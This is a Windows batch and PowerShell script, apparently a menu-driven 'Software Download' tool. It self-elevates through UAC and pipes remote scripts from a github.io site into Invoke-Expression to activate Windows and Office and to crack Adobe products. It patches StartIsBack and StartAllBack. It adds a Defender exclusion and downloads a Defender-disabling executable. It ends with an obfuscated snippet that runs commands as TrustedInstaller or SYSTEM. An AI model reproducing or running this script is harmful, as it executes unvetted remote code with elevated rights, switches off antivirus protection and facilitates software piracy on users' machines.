@Echo off
set "params=%*"&cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/c cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';iwr https://microtoolbox.github.io/batbox.exe -OutFile '%temp%\batbox.exe'
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';iwr https://microtoolbox.github.io/getinput.exe -OutFile '%temp%\getinput.exe'
set "batbox=%temp%\batbox.exe"
set "getinput=%temp%\getinput.exe"
Mode 48,15
Title Software Download
"%Batbox%" /h 0

:MainMenu
cls
Call :Button 17 4 "Microsoft" 19 8 "Adobe" 32 4 "StartIsBack" 27 12 "Defender Control" # Press
"%Getinput%" /m %Press% /h 70

:: Check for the pressed button 
if %errorlevel%==1 (goto :Microsoft)
if %errorlevel%==2 (goto :Adobe)
if %errorlevel%==3 (goto :StartIsBack)
if %errorlevel%==4 (call :DefenderControl)
goto :MainMenu

:Microsoft
cls
Call :Button 0 0 "Back" 12 4 "Windows" 25 4 "Office" 17 8 "Activation" # Press
"%Getinput%" /m %Press% /h 70
if %errorlevel%==1 (goto :MainMenu)
if %errorlevel%==2 (call :Windows)
if %errorlevel%==3 (call :Office)
if %errorlevel%==4 (call :MSActivation)
goto :Microsoft

:Windows
cls
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';irm https://microtoolbox.github.io/windows ^| iex
exit /b

:Office
cls
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';irm https://microtoolbox.github.io/office ^| iex
exit /b

:MSActivation
cls
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';irm https://microtoolbox.github.io/activate ^| iex
exit /b

:Adobe
cls
"%Batbox%" /g 21 2
"%Batbox%" /d "Software"
"%Batbox%" /g 20 9
"%Batbox%" /d "Activation"
Call :Button 0 0 "Back" 10 3 " Download Creative Cloud " 10 6 "Download Creative Suite 6" 10 10 "GenP" 20 10 "AMTEmu" 32 10 "UAP" # Press
"%Getinput%" /m %Press% /h 70
if %errorlevel%==1 (goto :MainMenu)
if %errorlevel%==2 (call :CreativeCloud)
if %errorlevel%==3 (call :CreativeSuite6)
if %errorlevel%==4 (call :GenP)
if %errorlevel%==5 (call :AMTEmu)
if %errorlevel%==6 (call :UAP)
goto :Adobe

:StartIsBack
cls
"%Batbox%" /g 21 2
"%Batbox%" /d "Software"
"%Batbox%" /g 20 9
"%Batbox%" /d "Activation"
Call :Button 0 0 "Back" 10 3 " Download StartIsBack++ " 11 6 "Download StartAllBack " 10 10 "SIB++" 33 10 "SAB" # Press
"%Getinput%" /m %Press% /h 70
if %errorlevel%==1 (goto :MainMenu)
if %errorlevel%==2 (call :SIB)
if %errorlevel%==3 (call :SAB)
if %errorlevel%==4 (call :ActivateSIB)
if %errorlevel%==5 (call :ActivateSAB)
goto :StartIsBack

:SIB
cls
ver|find "6.2"
if not errorlevel 1 (
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';iwr https://www.startisback.com/StartIsBack_setup.exe -OutFile "%WinDir%\SIB.exe"
start "" "%WinDir%\SIB.exe"
)
ver|find "6.3"
if not errorlevel 1 (
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';iwr https://www.startisback.com/StartIsBackPlus_setup.exe -OutFile "%WinDir%\SIB.exe"
start "" "%WinDir%\SIB.exe"
)
ver|find "10.0"
if not errorlevel 1 (
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';iwr https://www.startisback.com/StartIsBackPlusPlus_setup.exe -OutFile "%WinDir%\SIB.exe"
start "" "%WinDir%\SIB.exe"
)
exit /b

:SAB
cls
curl https://www.startallback.com/download.php -L -o "%WinDir%\SIB.exe"
start "" "%WinDir%\SIB.exe"
exit /b

:ActivateSIB
curl https://microtoolbox.github.io/msimg32.dll -o "%ProgramFiles(x86)%\StartIsBack\msimg32.dll"
taskkill /f /im explorer.exe
start explorer
exit /b

:ActivateSAB
curl https://microtoolbox.github.io/StartAllBack_3.x_Patch.exe -o "%temp%\StartAllBack_3.x_Patch.exe"
start /wait "" "%temp%\StartAllBack_3.x_Patch.exe"
del /F /Q "%temp%\StartAllBack_3.x_Patch.exe"
exit /b

:CreativeCloud
cls
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';irm https://microtoolbox.github.io/adobe_cc ^| iex
exit /b

:CreativeSuite6
cls
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';irm https://microtoolbox.github.io/adobe_cs6 ^| iex
exit /b

:GenP
cls
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';irm https://microtoolbox.github.io/adobe_genp ^| iex
exit /b

:AMTEmu
cls
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';irm https://microtoolbox.github.io/adobe_amtemu ^| iex
exit /b

:UAP
cls
powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';irm https://microtoolbox.github.io/adobe_uap ^| iex
exit /b

:Button
@setlocal enabledelayedexpansion

::---- Abbreviations meaning ----::
:: XBPB = X Button Positin Begin
:: YBPB = Y Button Positin Begin
:: XBPM = X Button Position Middle
:: YBPM = Y Button Position Middle
:: XBPE = X Button Positin End
:: YBPE = Y Button Positin End
:: HL   = Horizontal line
:: Lng[B] = Button Length
::
::------------ Help ------------::
:: [%1 = X coordinate]
:: [%2 = Y coordinate]
:: [%3 = Text of the Button]
:: [%4 = '#' : The end of arguments]
:: [%5 = 'Press' : Varible to use with Getinput.exe]
::
::------------------------------::
:: Exemple : Call Button [X1] [Y1] "Button 1" [X2] [Y2] "Button 2" [X3] [Y3] "Button 3" # Press
::------------------------------::


::------------- Begin Program -------------::
:SLoop
    if "%1"=="" (exit)
    if "%1"=="#" ("%batbox%" !Buttons! & endlocal & set "%~2=%Button_Dim%" & exit /b)
    set XBPB=%1
    set YBPB=%2
    set "Text_Button=%~3"

    :: Calculate the button length 'X2'
    call :Length "%Text_Button%" Lng[B]

    :: Calculate x & y positions
    set /a XBPE= XBPB + Lng[B] + 3 
    set /a YBPE= YBPB + 2
    set /a XBPM= XBPB + 1
    set /a YBPM= YBPB + 1
    set /a _Lng[B]= Lng[B] + 2
    :: Make the hor line
    set "HL=" & for /l %%i in (1,1,!_Lng[B]!) do (set HL=!HL! /a 196 )

    :: Calculate the button dim
    set /a XBB= XBPB + 1
    set /a YBB= YBPB + 1
    set /a XBE= XBPE - 1
    set /a YBE= YBPE - 1
    set Button_Dim=%Button_Dim% %XBB% %YBB% %XBE% %YBE%

    :: Make the button
    set Top_Left=/g %XBPB% %YBPB% /a 218
    set Top_Rihgt=/g %XBPE% %YBPB% /a 191
    set Base_Left=/g %XBPB% %YBPE% /a 192
    set Base_Right=/g %XBPE% %YBPE% /a 217
    set Hor_Line=/g %XBPM% %YBPB% !HL! /g %XBPM% %YBPE%  !HL!
    set Ver_Line=/g %XBPB% %YBPM% /a 179 /g %XBPE% %YBPM% /a 179
    set Text_Po=/g %XBPM% %YBPM% /d " %Text_Button% "

    :: Make all the buttons
    set Buttons=!Buttons! %Top_Left% %Top_Rihgt% %Base_Left% %Base_Right% %Hor_Line% %Ver_Line% %Text_Po%

    :: Get the next items
    for /l %%i in (1,1,3) do (shift /1)
goto SLoop
::------------- End Program -------------::

::------------- Begin Funcs -------------::
:Length
    set str=%~1
    set cn=-1
    :_Lp
    set /a cn+=1
    if "!str:~%cn%,1!" neq "" (goto _Lp)
    endlocal & set %2=!cn!
exit /b
::------------- End Funcs -------------::

:DefenderControl
cls
::Method 1
::reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
::reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
::rundll32 shell32.dll, RestartDialog
::Method 2
::powershell -ec QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFAAcgBlAHMAZQBuAHQAYQB0AGkAbwBuAEMAbwByAGUALABQAHIAZQBzAGUAbgB0AGEAdABpAG8AbgBGAHIAYQBtAGUAdwBvAHIAawA7AEkAZgAoACgARwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQApAC4ARQB4AGMAbAB1AHMAaQBvAG4ARQB4AHQAZQBuAHMAaQBvAG4AIAAtAEEAbgBkACgARwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQApAC4ARQB4AGMAbAB1AHMAaQBvAG4ARQB4AHQAZQBuAHMAaQBvAG4ALgBDAG8AbgB0AGEAaQBuAHMAKAAnACoAJwApACkAewBSAGUAbQBvAHYAZQAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBFAHgAdABlAG4AcwBpAG8AbgAgACoAOwBbAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAE0AZQBzAHMAYQBnAGUAQgBvAHgAXQA6ADoAUwBoAG8AdwAoACIARABlAGYAZQBuAGQAZQByACAAaQBzACAAbgBvAHcAIABFAE4AQQBCAEwARQBEACIALAAgACIARABlAGYAZQBuAGQAZQByACIAKQB9AEUAbABzAGUAewBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBFAHgAdABlAG4AcwBpAG8AbgAgACoAOwBbAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAE0AZQBzAHMAYQBnAGUAQgBvAHgAXQA6ADoAUwBoAG8AdwAoACIARABlAGYAZQBuAGQAZQByACAAaQBzACAAbgBvAHcAIABEAEkAUwBBAEIATABFAEQAIgAsACAAIgBEAGUAZgBlAG4AZABlAHIAIgApAH0A
::Method 3
powershell Add-MpPreference -ExclusionPath '%WinDir%\dcontrol.exe'
curl https://microtoolbox.github.io/dcontrol.exe -o "%WinDir%\dcontrol.exe"
start "" "%WinDir%\dcontrol.exe"
exit /b

#:RunAsTI snippet to run as TI/System, with innovative HKCU load, ownership privileges, high priority, and explorer support  
set ^ #=& set "0=%~f0"& set 1=%*& powershell -c iex(([io.file]::ReadAllText($env:0)-split'#\:RunAsTI .*')[1])& exit /b
function RunAsTI ($cmd,$arg) { $id='RunAsTI'; $key="Registry::HKU\$(((whoami /user)-split' ')[-1])\Volatile Environment"; $code=@'
 $I=[int32]; $M=$I.module.gettype("System.Runtime.Interop`Services.Mar`shal"); $P=$I.module.gettype("System.Int`Ptr"); $S=[string]
 $D=@(); $T=@(); $DM=[AppDomain]::CurrentDomain."DefineDynami`cAssembly"(1,1)."DefineDynami`cModule"(1); $Z=[uintptr]::size 
 0..5|% {$D += $DM."Defin`eType"("AveYo_$_",1179913,[ValueType])}; $D += [uintptr]; 4..6|% {$D += $D[$_]."MakeByR`efType"()}
 $F='kernel','advapi','advapi', ($S,$S,$I,$I,$I,$I,$I,$S,$D[7],$D[8]), ([uintptr],$S,$I,$I,$D[9]),([uintptr],$S,$I,$I,[byte[]],$I)
 0..2|% {$9=$D[0]."DefinePInvok`eMethod"(('CreateProcess','RegOpenKeyEx','RegSetValueEx')[$_],$F[$_]+'32',8214,1,$S,$F[$_+3],1,4)}
 $DF=($P,$I,$P),($I,$I,$I,$I,$P,$D[1]),($I,$S,$S,$S,$I,$I,$I,$I,$I,$I,$I,$I,[int16],[int16],$P,$P,$P,$P),($D[3],$P),($P,$P,$I,$I)
 1..5|% {$k=$_; $n=1; $DF[$_-1]|% {$9=$D[$k]."Defin`eField"('f' + $n++, $_, 6)}}; 0..5|% {$T += $D[$_]."Creat`eType"()}
 0..5|% {nv "A$_" ([Activator]::CreateInstance($T[$_])) -fo}; function F ($1,$2) {$T[0]."G`etMethod"($1).invoke(0,$2)}   
 $TI=(whoami /groups)-like'*1-16-16384*'; $As=0; if(!$cmd) {$cmd='control';$arg='admintools'}; if ($cmd-eq'This PC'){$cmd='file:'}
 if (!$TI) {'TrustedInstaller','lsass','winlogon'|% {if (!$As) {$9=sc.exe start $_; $As=@(get-process -name $_ -ea 0|% {$_})[0]}}
 function M ($1,$2,$3) {$M."G`etMethod"($1,[type[]]$2).invoke(0,$3)}; $H=@(); $Z,(4*$Z+16)|% {$H += M "AllocHG`lobal" $I $_}
 M "WriteInt`Ptr" ($P,$P) ($H[0],$As.Handle); $A1.f1=131072; $A1.f2=$Z; $A1.f3=$H[0]; $A2.f1=1; $A2.f2=1; $A2.f3=1; $A2.f4=1
 $A2.f6=$A1; $A3.f1=10*$Z+32; $A4.f1=$A3; $A4.f2=$H[1]; M "StructureTo`Ptr" ($D[2],$P,[boolean]) (($A2 -as $D[2]),$A4.f2,$false)
 $Run=@($null, "powershell -win 1 -nop -c iex `$env:R; # $id", 0, 0, 0, 0x0E080600, 0, $null, ($A4 -as $T[4]), ($A5 -as $T[5]))
 F 'CreateProcess' $Run; return}; $env:R=''; rp $key $id -force; $priv=[diagnostics.process]."GetM`ember"('SetPrivilege',42)[0]   
 'SeSecurityPrivilege','SeTakeOwnershipPrivilege','SeBackupPrivilege','SeRestorePrivilege' |% {$priv.Invoke($null, @("$_",2))}
 $HKU=[uintptr][uint32]2147483651; $NT='S-1-5-18'; $reg=($HKU,$NT,8,2,($HKU -as $D[9])); F 'RegOpenKeyEx' $reg; $LNK=$reg[4]
 function L ($1,$2,$3) {sp 'HKLM:\Software\Classes\AppID\{CDCBCFCA-3CDC-436f-A4E2-0E02075250C2}' 'RunAs' $3 -force -ea 0
  $b=[Text.Encoding]::Unicode.GetBytes("\Registry\User\$1"); F 'RegSetValueEx' @($2,'SymbolicLinkValue',0,6,[byte[]]$b,$b.Length)}
 function Q {[int](gwmi win32_process -filter 'name="explorer.exe"'|?{$_.getownersid().sid-eq$NT}|select -last 1).ProcessId}
 $11bug=($((gwmi Win32_OperatingSystem).BuildNumber)-eq'22000')-AND(($cmd-eq'file:')-OR(test-path -lit $cmd -PathType Container))
 if ($11bug) {'System.Windows.Forms','Microsoft.VisualBasic' |% {[Reflection.Assembly]::LoadWithPartialName("'$_")}}
 if ($11bug) {$path='^(l)'+$($cmd -replace '([\+\^\%\~\(\)\[\]])','{$1}')+'{ENTER}'; $cmd='control.exe'; $arg='admintools'}
 L ($key-split'\\')[1] $LNK ''; $R=[diagnostics.process]::start($cmd,$arg); if ($R) {$R.PriorityClass='High'; $R.WaitForExit()}
 if ($11bug) {$w=0; do {if($w-gt40){break}; sleep -mi 250;$w++} until (Q); [Microsoft.VisualBasic.Interaction]::AppActivate($(Q))}
 if ($11bug) {[Windows.Forms.SendKeys]::SendWait($path)}; do {sleep 7} while(Q); L '.Default' $LNK 'Interactive User'
'@; $V='';'cmd','arg','id','key'|%{$V+="`n`$$_='$($(gv $_ -val)-replace"'","''")';"}; sp $key $id $($V,$code) -type 7 -force -ea 0
 start powershell -args "-win 1 -nop -c `n$V `$env:R=(gi `$key -ea 0).getvalue(`$id)-join''; iex `$env:R" -verb runas
}; $A=$env:1-split'"([^"]+)"|([^ ]+)',2|%{$_.Trim(' "')}; RunAsTI $A[1] $A[2]; #:RunAsTI lean & mean snippet by AveYo, 2022.01.28
